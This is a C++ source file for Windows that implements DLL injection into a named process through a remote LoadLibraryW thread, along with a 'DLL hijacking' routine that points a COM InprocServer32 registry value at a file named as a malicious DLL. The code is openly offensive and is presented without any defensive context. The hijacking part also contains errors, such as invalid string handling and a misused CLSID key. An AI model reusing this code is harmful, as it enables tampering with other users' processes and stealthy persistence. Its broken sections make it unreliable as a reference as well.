#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <vector>

// A function that executes code that will be injected into another process
void ExecuteCode()
{
     // Put the code that will be executed when injected into another process here
     MessageBox(NULL, L"Code injected into another process!", L"Success", MB_OK);
}

// The function that executes DLL Inject
void DLLInject(DWORD processId, const wchar_t* dllPath)
{
     // Open a handle to the target process
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
     if (hProcess == NULL)
     {
         // Process open error handling
         std::cout << "The process could not be opened." << std::endl;
         return;
     }

     // Allocate memory in the target process for the path to the DLL
     LPVOID remoteDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
     if (remoteDllPath == NULL)
     {
         // Handling a memory allocation error in the target process
         std::cout << "Unable to allocate memory in target process." << std::endl;
         CloseHandle(hProcess);
         return;
     }

     // Store the path to the DLL in the memory of the target process
     if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), NULL))
     {
         // Handling a write error to the target process's memory
         std::cout << "Could not write data to target memory." << std::endl;
         VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return;
     }

     // Create a remote thread in the target process that will load the DLL
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, remoteDllPath, 0, NULL);
     if (hThread == NULL)
     {
         // Handle remote thread creation error
         std::cout << "Could not create a remote thread in the target process." << std::endl;
         VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return;
     }

     // Wait for thread to end
     WaitForSingleObject(hThread, INFINITE);

     // Release resources
     VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
     CloseHandle(hThread);
     CloseHandle(hProcess);

     std::cout << "DLL injected into process ID: " << processId << std::endl;
}

// Function that performs DLL Hijacking
void DLLHijack(const wchar_t* targetFilePath, const wchar_t* maliciousDllPath)
{
     // Replace the name of the target DLL in the application path with the name of the malicious DLL
     std::wstring targetPath(targetFilePath);
     std::wstring dllName = targetPath.substr(targetPath.find_last_of(L"\\") + 1);
     std::wstring maliciousPath = targetPath.substr(0, targetPath.find_last_of(L"\\") + 1) + maliciousDllPath;

     // Save the modified path to the system registry
     HKEY hKey;
     if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\CLSID\\" + dllName, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
     {
         RegSetValueEx(hKey, L"InprocServer32", 0, REG_SZ, (BYTE*)maliciousPath.c_str(), (maliciousPath.length() + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
     }

     std::cout << "DLL changed for file: " << targetFilePath << std::endl;
}

// A function to get the process ID based on the name
DWORD GetProcessIdByName(const wchar_t* processName)
{
     PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);

     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

     if (Process32First(snapshot, &entry) == TRUE)
     {
         while (Process32Next(snapshot, &entry) == TRUE)
         {
             if (wcsicmp(entry.szExeFile, processName) == 0)
             {
                 CloseHandle(snapshot);
                 return entry.th32ProcessID;
             }
         }
     }

     CloseHandle(snapshot);
     return 0;
}

int main()
{
     // ID of the target process for DLL Inject
     DWORD targetProcessId = GetProcessIdByName(L"target.exe");

     // Path to the target DLL for DLL Inject
     const wchar_t* dllPath = L"C:\\Path\\To\\YourDll.dll";

     // Calling the DLL Inject function
     DLLInject(targetProcessId, dllPath);

     // Path to target file for DLL Hijacking
     const wchar_t* targetFilePath = L"C:\\Path\\To\\Target.exe";

     // Path to Malicious DLL for DLL Hijacking
     const wchar_t* maliciousDllPath = L"C:\\Path\\To\\MaliciousDll.dll";

     // Call DLL Hijacking
     DLLHijack(targetFilePath, maliciousDllPath);

     return 0;
}
